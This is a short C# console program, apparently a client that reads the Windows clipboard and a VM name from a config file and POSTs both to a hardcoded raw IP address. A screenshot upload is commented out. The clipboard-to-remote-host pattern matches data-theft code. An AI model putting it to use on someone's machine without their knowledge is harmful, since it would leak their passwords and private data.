using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading.Tasks;

namespace client_netframework
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            String clipboard = Clipboard.GetText(TextDataFormat.Text);

            Console.WriteLine(clipboard);

            String[] configs = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), "config.txt"));
            String url = "http://45.32.126.213:8889";
            String vmName = configs[0];

            var values = new Dictionary<string, string>{
                {  "vmName", vmName },
                //{ "imageBase64", base64},
                    { "clipboard", clipboard }
            };

            Console.WriteLine(vmName);
            Console.WriteLine(url);

            Task task = SendRequest.POSTRequest(url, values);
            task.Wait();
        }
    }
}
